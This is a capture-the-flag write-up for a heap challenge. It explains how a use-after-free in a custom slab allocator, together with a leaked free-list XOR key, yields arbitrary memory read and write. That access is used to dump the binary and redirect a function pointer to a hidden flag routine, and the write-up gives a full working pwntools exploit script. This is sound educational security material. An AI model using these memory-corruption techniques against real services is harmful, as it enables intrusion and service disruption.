---
title: "Slab"
category: "Pwn"
tags: ["uaf", "custom-allocator"]
solve_date: "2026-10-10T13:30:00+07:00"
language: "en"
---

# Slab

**Flag:** `isfcr{cust0m_sl4b_n0_gl1bc_r3c1p3_s4v3s_y0u}`  
**Target:** `nc 0.cloud.chals.io 20535` — attacked remote-only; no binary was supplied for this session

## Challenge

> A neat little note store. Convince it to hand you something that was never filed.

A line-oriented note store behind a custom slab allocator. Every connection speaks this protocol:

```text
slab store. commands: alloc | free <i> | edit <i> <hex> | read <i> | report | quit
```

`alloc` returns `idx N` (16 slots, 0-15), `edit` writes hex-decoded bytes into a slot, `read` returns a hex
dump of exactly 96 bytes, `free` releases a slot and `report` answers `nothing to report.`. There is no
win function reachable by normal use and no binary was handed to us, so the whole solve had to be built
from service behaviour and then from the executable recovered out of the server's own memory.

## Initial Analysis

Triage of the live service produced three facts that shaped everything after.

1. **Freed slots stay fully accessible.** After `alloc; edit 0 <data>; free 0; read 0` the note is still
   readable, and `edit 0 <hex>` after `free 0` still writes. The allocator only clears its own "in use"
   flag and keeps the slot's pointer in the index table — a use-after-free read *and* write by design.
2. **`free` writes 8 metadata bytes at the start of the object.** Freeing an empty slot replaced its first
   8 bytes with something that was not our data.
3. **Those 8 bytes are an obfuscated linked-list pointer.** Freeing the *first* object into an empty list
   gave the same 8 bytes for the whole lifetime of one service process (during one run:
   `0dbeb947a14c2f93`); freeing a second object gave a value differing only in its low 3 bytes, and the
   `XOR` of the two ciphertexts was exactly `0x4b6ba0`. The only consistent model is

   ```text
   stored_fd = KEY ^ next_object_pointer        (KEY = 8-byte global secret)
   ```

   so the arena's first object lives at `0x4b6ba0` and `KEY` for that service process is
   `0x932f4ca147b9be0d` (`bytes.fromhex("0dbeb947a14c2f93")` little-endian).

`KEY` stayed identical across dozens of sequential connections and only changed when the listener itself
restarted, which means it is generated once at startup (a `getrandom` call visible in the recovered code,
writing to `0x4b6b90`) and then inherited by every forked connection handler. It is therefore secret per
*process*, not per connection — and it is leaked for free by the very first `free` of any connection.

## Eliminated Hypotheses

Recorded because each one cost a real probe:

- **glibc tcache with safe-linking.** Rejected: safe-linking masks with `chunk_addr >> 12`, so two
  different objects freed into an empty list must give two different ciphertexts. They gave the same one.
  The derived "pointers" also land in static `.bss`, not on a heap.
- **Linear overflow out of an object.** Rejected by measurement: `edit` with 128 bytes into a 96-byte
  object leaves the neighbouring object untouched, and `read` returns exactly 96 bytes. Nothing spills;
  the write and the read are both clamped to the object.
- **Getting `report` to talk by reaching some allocator state.** Rejected: `report` still printed
  `nothing to report.` after allocating all 16 slots, after freeing them all, after churn
  (`alloc, alloc, free 0, alloc`) and after a double free. `report` does not inspect the notes at all —
  as the disassembly later showed, it is an indirect call through a global pointer.
- **Reading ELF section headers from memory.** Rejected the hard way: `e_shoff` (`0x370fa8`) is a file
  offset, not a virtual address. Pointing the primitive there dereferences unmapped memory and kills the
  process serving the connection.
- **Reusing a `KEY` captured earlier.** Rejected: after the service restarted, a poisoned fd built from a
  stale `KEY` decoded into a wild pointer, and the connection (plus the listener) died. `KEY` must be
  leaked against the current process.

## Exploitation Chain

### 1. Leak the key of the current process

`alloc` three times, `free` all three, then `read` the slot freed first. That `free` saw an empty list, so
its stored fd is `KEY ^ 0 = KEY`.

### 2. Turn the fd into an arbitrary-alloc primitive

The allocator pops the list head and copies the popped value straight into the index table
(`mov qword ptr [rdx*8 + 0x4b6b00], rax`), with no validation of the address at all. Since we can `edit`
a freed slot, we can rewrite its fd:

```text
alloc        ; helper object h          (writable arena memory)
free h       ; h is the list head again
edit h <p64(KEY ^ target)>              ; fd of h now decodes to `target`
alloc        ; pops h back into slot h
alloc        ; pops `target` -> table[i] == target
read i       ; 96 bytes at absolute address `target`
edit i <..>  ; 96 bytes of write at absolute address `target`
```

Three operational rules make this survivable: never `free` a slot whose pointer sits in a read-only page
(`free` writes 8 bytes there and segfaults), verify the fd bytes after `edit` before letting the allocator
pop them, and only touch addresses inside a loaded segment.

### 3. Recover the binary from the server's memory

Each probe yields 96 bytes, and the index table holds only 16 entries, so ~13 probes per connection and
several connections per kilobyte. Dumping 96-byte blocks over the loaded ranges gave:

| Read | What it showed |
|---|---|
| `0x400000` | ELF header: `ET_EXEC`, non-PIE, base `0x400000`, statically linked, `e_shoff = 0x370fa8` |
| `0x400040` | 10 program headers: `r-x 0x400000-0x4867fd`, `r-- 0x487000-0x4afbf0`, `rw- 0x4b09c8-0x4bd1e8` |
| `0x4b6000-0x4b9000` | the arena region — every object reads as zero in a fresh connection handler, no flag filed anywhere near the arena |
| `0x487240-0x488800` | `.rodata` of the app: `nothing to report.\n`, `no index slots\n`, `arena full\n`, `bad index\n`, `idx %d\n`, `0123456789abcdef`, **`flag.txt`**, `[chall] slab on 127.0.0.1:%d\n` |
| `0x401b00-0x402b20` | the app's own code, disassembled offline with capstone |

The disassembly gave the exact layout and the intended exit:

```nasm
; globals: flags[16] = 0x4b6ac0, table[16] = 0x4b6b00, list head = 0x4b6b80,
;          bump count = 0x4b6b88, KEY = 0x4b6b90, objects = 0x4b6ba0 + 96*i
; free i:  fd = head ^ KEY ; head = object ; flags[i] = 0 ; table[i] is NOT cleared
; alloc  :  if (head) { obj = head; head = *obj ^ KEY; } else { obj = 0x4b6ba0 + 96*count++; }
;           table[i] = obj                        ; raw pointer, unvalidated
; read i :  hex-dump 96 bytes at table[i]
```

and, decisive, the two halves of the puzzle:

```nasm
0x401ee2: jne 0x40225c              ; command != "report"
0x401ee8: call qword ptr [rip+0xb31e2]   ; -> call [0x4b50d0]   writable function pointer
```

`[0x4b50d0]` points at `0x401d6c`, the routine that prints `nothing to report.\n`. Meanwhile nothing calls
the routine at `0x4022e6`, and nothing ever will through normal use:

```nasm
0x4022e6: entry, referenced by nothing in the command dispatch
0x402306: mov edi, 0x4872d4        ; "flag.txt"   -> call open(path, O_RDONLY)
0x40231e: mov rsi, rsp ; mov edx, 0xa0 -> call read(fd, buf, 160)
0x402369: mov rsi, rsp ; mov rdx, rax ; mov edi, [0x4b50c8] -> call write(connfd, buf, n)
```

That unreferenced flag emitter is the thing "that was never filed": present in the binary, not wired to
any command.

### 4. Rewire `report` and ask for it

Land a slot on `0x4b50d0` with the step-2 primitive, sanity-check that it currently holds a code pointer,
overwrite it with `0x4022e6`, then send `report`.

## Flag

```text
isfcr{cust0m_sl4b_n0_gl1bc_r3c1p3_s4v3s_y0u}
```

The string was returned by the live service, printed by the `0x4022e6` routine, three separate times
across two different service processes (identical value each time). The overwrite lives only in the
forked connection handler: a connection opened afterwards still reported
`[0x4b50d0] = 0x401d6c`, so the exploit does not disturb other players. It was not submitted to the
scoreboard during this session, so acceptance is unconfirmed.

## Reproduce

Python 3 with `pwntools`; `capstone` is only needed if you want to repeat the memory-recovery step rather
than take `0x4b50d0` / `0x4022e6` on faith. Both constants are safe to hardcode because the binary is
non-PIE. Save as `slab_solve.py` and run `python slab_solve.py`.

```python
import re, struct, time
from pwn import remote

HOST, PORT = "0.cloud.chals.io", 20535
FN_REPORT_PTR = 0x4B50D0   # .data: `report` does  call qword ptr [0x4b50d0]
FN_FLAG = 0x4022E6         # open("flag.txt"); read(fd, buf, 160); write(connfd, buf, n)

u64 = lambda b: struct.unpack("<Q", b[:8])[0]
p64 = lambda v: struct.pack("<Q", v & (2 ** 64 - 1))


class Slab:
    def __init__(self):
        self.io = remote(HOST, PORT, timeout=15)
        self.io.recvline()
        self.io.recvuntil(b"> ", timeout=5)

    def cmd(self, line):
        self.io.sendline(line.encode() if isinstance(line, str) else line)
        time.sleep(0.05)
        return self.io.recvuntil(b"> ", timeout=8)[:-2].strip()

    def alloc(self):
        m = re.search(rb"idx (\d+)", self.cmd("alloc"))
        return int(m.group(1)) if m else None

    def free(self, i):
        return self.cmd("free %d" % i)

    def read(self, i):
        m = re.search(rb"data ([0-9a-f]+)", self.cmd("read %d" % i))
        return bytes.fromhex(m.group(1).decode()) if m else b""

    def edit(self, i, blob):
        return self.cmd("edit %d %s" % (i, blob.hex()))

    def leak_key(self):
        a, b, c = self.alloc(), self.alloc(), self.alloc()
        self.free(a)            # list was empty -> stored fd == KEY
        self.free(b)
        self.free(c)
        return u64(self.read(a)[:8])

    def slot_at(self, key, target):
        """Return a live index whose table pointer equals `target`."""
        h = self.alloc()
        self.free(h)
        want = p64(key ^ target)
        self.edit(h, want)
        assert self.read(h)[:8] == want, "fd write did not stick"
        assert self.alloc() == h, "helper was not re-popped"
        return self.alloc()     # pops `target`


def main():
    s = Slab()
    key = s.leak_key()
    print("[*] free-list key = 0x%016x" % key)

    slot = s.slot_at(key, FN_REPORT_PTR)
    original = u64(s.read(slot)[:8])
    print("[*] [0x%x] = 0x%x (default report handler)" % (FN_REPORT_PTR, original))
    assert 0x400000 <= original <= 0x4C0000, "unexpected pointer, refusing to corrupt"

    s.edit(slot, p64(FN_FLAG))
    print("[*] [0x%x] = 0x%x now" % (FN_REPORT_PTR, u64(s.read(slot)[:8])))
    print("[*] report -> %s" % s.cmd("report").decode(errors="replace"))
    s.io.close()


main()
```

Observed output:

```text
[*] free-list key = 0x618d5153e0045e29
[*] [0x4b50d0] = 0x401d6c (default report handler)
[*] [0x4b50d0] = 0x4022e6 now
[*] report -> isfcr{cust0m_sl4b_n0_gl1bc_r3c1p3_s4v3s_y0u}
```

The key value is per service process and will differ; the two addresses will not.

## Service observation for the organizers

The store dereferences the linked-list pointer it was handed without any bounds check, and the listener
is a single forking process. During analysis, two dereferences of a bad pointer (one `free` of a slot
pointing at a read-only page, one fd poisoned with a stale key) did not just drop the connection — the
port refused connections for about 3.5 minutes until the supervisor brought the service back, which also
re-rolled the key. Validating that a popped pointer lies inside the arena would remove both the
primitive and the crash mode.
